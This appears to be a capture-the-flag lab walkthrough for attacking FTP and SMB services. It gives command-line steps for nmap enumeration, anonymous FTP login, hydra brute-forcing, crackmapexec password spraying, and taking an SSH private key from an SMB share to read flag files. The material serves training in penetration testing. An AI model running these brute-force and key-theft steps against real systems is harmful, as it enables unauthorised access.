# Attacking FTP
Enumerate the target
sudo nmap -sC -sV <Target IP>
FTP open on port 2***
*Apparently sometimes the port 2*** doesn't show up during the scan, if that happens, restart the Target VM*

Anonymously log into the target via ftp
ftp anonymous@<Target IP> -p 2***

Check for files with ls

Download the users.list and passwords.list
get users.list
get passwords.list

Use hidra to brute force the username and password, this will take a few minutes
hydra -L users.list -P passwords.list ftp://<Target IP>:2***

Found username and password

use the new username and password to ssh into the Target
ssh r****@<Target Ip>

Find the flag on the machine using ls
cat flag.txt

# Attacking SMB
For the first question, 
use smbmap -H <Target IP>
*Look for the one with read only permissions*

For the second question, 
sudo crackmapexec smb <Target Ip> -u jason -p pws.list --local-auth
*pws.list is in the resources section on the top of the page*

For the third question, 
smbclient //<Target IP>/G** -U jason
get id_rsa
open new terminal where id_rsa was downloaded, then chmod 600 id_rsa
ssh -i id_rsa jason@<Target IP>
cat flag.txt
